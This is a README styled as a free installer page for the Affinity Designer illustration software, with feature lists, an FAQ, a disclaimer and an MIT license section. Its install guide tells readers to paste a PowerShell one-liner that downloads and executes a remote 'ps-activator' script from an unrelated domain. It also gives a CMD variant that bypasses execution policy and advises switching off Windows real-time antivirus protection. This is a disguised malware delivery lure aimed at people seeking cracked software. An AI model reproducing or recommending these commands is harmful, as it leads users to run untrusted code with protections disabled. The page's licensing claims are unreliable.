<div align="center">

# Affinity Designer: Professional Vector & Raster Illustration Software for Windows 11

![](files/preview.png)

[![ps-core](https://img.shields.io/badge/PS--CORE-INSTALLER-2f81f7?style=social&labelColor=0d1117)]() [![system](https://img.shields.io/badge/SYSTEM-WINDOWS-54aeff?style=social&labelColor=0d1117)]() [![license](https://img.shields.io/badge/LICENSE-MIT-0969da?style=social&labelColor=0d1117)]() [![users](https://img.shields.io/badge/USERS-2.8K-1f6feb?style=social&labelColor=0d1117)]() [![pipeline](https://img.shields.io/badge/PIPELINE-OK-2ea44f?style=social&labelColor=0d1117)]()

</div>

---

Affinity Designer is a professional vector and raster illustration application engineered for precision and performance on desktop systems. It provides a unified workspace where vector curves and pixel-based painting coexist, allowing illustrators, UI/UX designers, and concept artists to move fluidly between workflows without switching tools. The software includes advanced pen and pencil instruments for detailed path construction, custom brush and texture support compatible with industry brush sets, and comprehensive color management with CMYK, LAB, and Pantone coverage. It handles AFPHOTO, PSD, SVG, PDF, EPS, PNG, JPG, and TIFF formats, and runs on 64-bit Windows 10 or 11 with 8 GB of RAM minimum and a DirectX 10+ compatible GPU.

## 🚀 PowerShell Install Guide

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Open PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Run the script
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ Forced run via CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Unified Vector and Raster Workspaces** – switch between vector and pixel editing modes within a single document, preserving layer structure and object editability across both workflows.

- **Precision Pen and Curve Tools** – node-based path editing with adjustable handles, curve smoothing, and boolean operations for constructing complex geometric illustrations.

- **Custom Brush and Texture Engine** – supports raster brush creation and texture-based strokes, with pressure and velocity dynamics for natural-looking freehand work.

- **Color Management and Gradients** – multi-channel color control across RGB, CMYK, LAB, and spot color workflows, with linear, radial, and conical gradient fills.

- **Non-Destructive Layer Effects** – apply adjustable effects, blend modes, and masks that remain editable without altering source geometry or pixel data.

- **Artboard and Export Control** – define multiple artboards per document and export individual regions with configurable resolution, compression, and format settings.

- **Wide Format Compatibility** – reads and writes vector and raster formats including SVG, PDF, EPS, PSD, PNG, JPG, and TIFF.

- **GPU-Accelerated Rendering** – hardware-accelerated canvas rendering for smooth panning, zooming, and real-time preview of complex documents.

## How it works

Affinity Designer executes a unified rendering pipeline in which vector and raster content coexist within a single document model. Every layer is tagged as vector or pixel data, and the compositor rasterizes both streams in real time so edits remain non-destructive across modes.

Core vector operations are handled by a resolution-independent geometry engine. Pen and pencil input is converted to Bézier paths with adjustable nodes, and boolean operations, path smoothing, and stroke expansion are computed analytically before rasterization. This keeps curves crisp at any zoom level and ensures print-ready output without loss of fidelity.

The raster subsystem processes pixel layers through a GPU-accelerated brush engine. Brush dynamics, texture mapping, and blending modes are evaluated per stroke, while color management converts between document and display profiles. Because raster and vector layers share the same compositing stack, pixel detailing can be applied directly over vector shapes and vice versa.

Brush and texture assets are loaded through a format parser that reads standard brush sets and maps them onto the internal dynamics model. Gradients, swatches, and document palettes are stored as reusable resources, with color values tracked in the document's working space to maintain consistency across CMYK, LAB, and Pantone definitions.

Document state is maintained through an undo history that records discrete operations rather than full snapshots, enabling efficient rollback of both vector and pixel edits. File I/O serializes the document graph into native formats and exports flattened or layered output to industry-standard formats, preserving layer structure where the target format permits it.

Performance is sustained by tiled rendering and viewport culling, which limit redraw work to visible regions. The application runs as a native desktop executable, targeting 64-bit Windows environments with DirectX-capable graphics hardware, and allocates memory per document to keep large multi-layer projects responsive.

## Compatibility

The application is designed for desktop environments and targets the following platforms:

- **Windows:** Windows 10 and Windows 11, 64-bit editions.
- **macOS:** Intel-based and Apple silicon systems running a supported macOS release.
- **Linux:** Distribution-agnostic builds where the required desktop libraries are present.

System requirements for reliable operation:

- **CPU:** 64-bit Intel or AMD processor (Apple silicon natively supported on macOS).
- **RAM:** 8 GB minimum; 16 GB or more recommended for large multi-artboard documents and raster-heavy compositions.
- **GPU:** DirectX 10-compatible or Metal-capable hardware with current drivers.
- **Display:** 1280x768 minimum resolution; higher-density displays are fully supported.
- **Storage:** Sufficient free disk space for application files, brush libraries, and scratch data used during raster operations.

File format interoperability:

- **Native:** reads and writes the project's native document format, preserving layers, artboards, symbols, and live effects.
- **Import:** PSD, SVG, PDF, EPS, PNG, JPG, TIFF, and common Photoshop brush sets (.abr).
- **Export:** PSD, SVG, PDF, EPS, PNG, JPG, TIFF, and additional raster targets, with control over color space and resolution.

Color and output compatibility:

- Full support for RGB, CMYK, LAB, and spot color workflows, including Pantone references.
- Embedded ICC profile handling for consistent color across import, editing, and export.
- Vector output remains resolution-independent; raster export supports configurable DPI and compression.

Input and workflow integration:

- Pressure-sensitive pen and tablet input for the pen, pencil, and brush tools.
- Standard keyboard and precision pointer workflows, with configurable shortcuts.
- Documents remain editable across supported platforms, allowing handoff between team members on different operating systems.

Compatibility notes:

- Older operating system releases outside the supported versions are not guaranteed to run the application.
- Third-party brushes and assets are supported to the extent their formats are documented; vendor-specific metadata may be flattened on import.
- Files created in newer versions of the application may not open in older releases; users working across versions should standardize on a shared release.

## FAQ

**Is Affinity Designer suitable for both vector and raster workflows?**
Yes. The application provides a unified document environment in which vector and pixel layers coexist. Users can switch between the Designer Persona for precision path editing and the Pixel Persona for raster painting without leaving the document or converting between formats. This eliminates the round-tripping typically required when moving artwork between separate vector and raster applications.

**Which file formats are supported for import and export?**
Native documents are saved in the AFDESIGN format, preserving layers, live effects, and non-destructive adjustments. The application imports and exports PSD, SVG, PDF, EPS, PNG, JPG, and TIFF. PSD round-tripping preserves layer structure and blend modes, while SVG and PDF exports maintain vector fidelity for downstream production workflows.

**Does the software support non-destructive editing?**
Yes. Live filters, adjustment layers, layer effects, and mask layers are applied non-destructively and remain fully re-editable. Vector shapes retain their path data and stroke attributes at all times, and raster layers can be masked and filtered without committing changes to source pixels.

**What color management capabilities are available?**
Documents support RGB, CMYK, LAB, and grayscale color spaces with embedded ICC profiles. Spot color support, including Pantone libraries, is available for print-oriented work. Color profiles can be assigned and converted at the document level, and soft proofing allows on-screen preview of output intent.

**Is there a brush engine compatible with existing brush libraries?**
The brush engine supports raster brush sets in the Adobe ABR format, allowing import of existing libraries. Vector brushes are also available for stroke-based work that must remain resolution-independent. Brush dynamics, texture, and nozzle controls are configurable per brush.

**Can the application handle large, complex documents?**
The rendering engine is hardware-accelerated and optimized for documents with high layer counts and large canvas dimensions. Sixty-frames-per-second panning and zooming are maintained on supported GPUs, and the 64-bit architecture allows utilization of system memory beyond the limits of 32-bit applications.

**What are the minimum system requirements?**
Windows 10 or 11, 64-bit. An Intel or AMD 64-bit processor, 8 GB of RAM (16 GB recommended for complex documents), and a DirectX 10-compatible GPU. Additional disk space is required for scratch files when working with large documents.

**Is a subscription required?**
No. The software is licensed as a one-time purchase with no recurring subscription fees. Perpetual license holders receive the version they purchased and are not required to renew to retain access.

## Disclaimer

This software is provided on an "as is" and "as available" basis, without warranties of any kind, whether express, implied, or statutory, including but not limited to warranties of merchantability, fitness for a particular purpose, title, and non-infringement. No representation is made that the software will be error-free, uninterrupted, or free of defects, or that all defects will be corrected.

To the maximum extent permitted by applicable law, the authors, maintainers, and contributors of this project shall not be liable for any direct, indirect, incidental, special, consequential, exemplary, or punitive damages arising out of or in any way connected with the use of, inability to use, or reliance upon this software, including but not limited to loss of data, loss of profits, business interruption, or damage to hardware or systems, even if advised of the possibility of such damages.

The user assumes sole responsibility for determining the appropriateness of using this software and for any consequences arising from such use, including the adequacy of independent data backup and recovery procedures. This software is not intended for use in environments where failure could lead to injury, loss of life, or significant physical or financial harm, and any such use is undertaken entirely at the user's own risk.

All product names, formats, and trademarks referenced in connection with this project remain the property of their respective owners and are used for identification and compatibility description purposes only. Reference to any third-party format, specification, or workflow does not constitute endorsement, certification, or affiliation.

## License

This project is distributed under the MIT License, a permissive open-source license designed to maximize freedom of use while preserving attribution and limiting liability for the authors. The license applies to all original source code, build scripts, and accompanying documentation included in this repository.

**Granted Rights**

- **Use** — the software may be used for personal, academic, or commercial purposes without restriction.
- **Modification** — source files may be altered, extended, or refactored to suit individual or organizational requirements.
- **Distribution** — original or modified copies may be redistributed, including as part of a larger proprietary product.
- **Sublicensing** — derivative works may be relicensed under different terms, provided the original notice is preserved.

**Conditions**

- The original copyright notice and this permission notice must be included in all copies or substantial portions of the software.
- Modified distributions must not misrepresent the origin of the original work.
- Any warranty, support, or liability statements added by downstream distributors are their sole responsibility.

**Disclaimer of Warranty**

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

**Compliance Notes**

- Third-party dependencies retain their own respective licenses; consult the dependency manifest for details.
- Users are responsible for ensuring compliance with local laws and regulations applicable to their use case.
- Contributions submitted to this project are assumed to be licensed under the same terms unless explicitly stated otherwise.